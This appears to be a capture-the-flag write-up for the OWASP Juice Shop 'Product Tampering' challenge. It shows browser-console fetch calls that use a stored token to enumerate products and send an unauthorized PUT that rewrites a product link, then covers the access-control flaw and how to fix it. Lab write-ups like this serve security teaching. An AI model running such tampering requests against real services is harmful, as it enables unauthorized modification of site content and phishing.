### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as modifying the `href` of a link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description to point to `https://owasp.slack.com`.

2. **Challenge Key Identification**
   - Queried the challenges API to confirm the key and objective:
     ```javascript
     fetch('/api/Challenges/', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(d => {
       const c = d.data.find(x => x.name === 'Product Tampering')
       console.log(c.key, c.description)
     })
     // Output: changeProductChallenge
     ```

3. **Product Enumeration**
   - Searched the Products API to find the O-Saft product and its ID:
     ```javascript
     fetch('/api/Products?q=O-Saft', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(d => {
       const p = d.data.find(x => x.name.includes('O-Saft'))
       console.log(p.id, p.name, p.description)
     })
     // Output: id=9, description contains <a href="https://www.owasp.org/index.php/O-Saft">
     ```

4. **API Tampering**
   - Sent a PUT request directly to `/api/Products/9` with the modified description containing the new `href` value:
     ```javascript
     fetch('/api/Products/9', {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + localStorage.getItem('token')
       },
       body: JSON.stringify({
         description: 'O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href="https://owasp.slack.com" target="_blank">More...</a>'
       })
     })
     ```

5. **Validation**
   - The server accepted the modification, and the challenge was marked as solved.

3. **Tools Used**
   - **Browser DevTools (Console)**
   - **Custom JavaScript `fetch` API**

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Broken Access Control** — Missing authorization on product modification endpoint (CWE-285)

2. **Affected Components**
   - **Product API Endpoint** (`PUT /api/Products/:id`)

3. **Severity Level**
   - **High**
     - Any authenticated user can modify product data, including descriptions, names, prices, or other attributes.
     - No role-based access control (RBAC) is enforced, allowing unauthorized users to tamper with product content.

---
### **Risks**

1. **Business Impact**
   - **Content Manipulation**: Unauthorized users can alter product descriptions, leading to misinformation and potential fraud.
   - **Phishing via Link Injection**: Legitimate links can be replaced with malicious URLs, redirecting users to phishing sites.
   - **XSS Escalation**: The same endpoint can be used to inject XSS payloads into product descriptions.
   - **Financial Damage**: Price manipulation via the API could allow unauthorized discounts or fraudulent transactions.
   - **Reputational Damage**: Publicly visible tampered product content directly harms the company's image and customer trust.

2. **Exploitation Potential**
   - Attackers can modify product data to mislead customers or inject malicious content.
   - The vulnerability can be chained with other attacks (e.g., phishing or XSS) to escalate impact.

---
### **Actions**

#### **Risk Mitigation Strategies**
- **Role-Based Access Control (RBAC)**: Restrict product modification endpoints to users with the `admin` role.
- **Principle of Least Privilege**: Regular customers should have read-only access to product information.
- **Monitoring and Logging**: Log and monitor all write operations on product data to detect unauthorized modifications.

#### **Remediation Fixes**
- **Backend Modifications**:
  - Add an authorization middleware to the `PUT /api/Products/:id` route to verify the requesting user has the `admin` role.
  - Validate and sanitize all input fields (description, name, price) on the server side before storing them.
- **Audit Trail**: Implement an audit trail for product modifications, recording who changed what and when.

#### **Best Security Practices**
- **Server-Side Authorization**: Never rely on the frontend to enforce access control; all authorization checks must be enforced server-side.
- **OWASP API Security Top 10**: Follow OWASP API Security Top 10 guidelines, particularly:
  - API1: Broken Object Level Authorization
  - API5: Broken Function Level Authorization
- **Regular Audits**: Conduct regular security audits to identify and fix similar vulnerabilities.
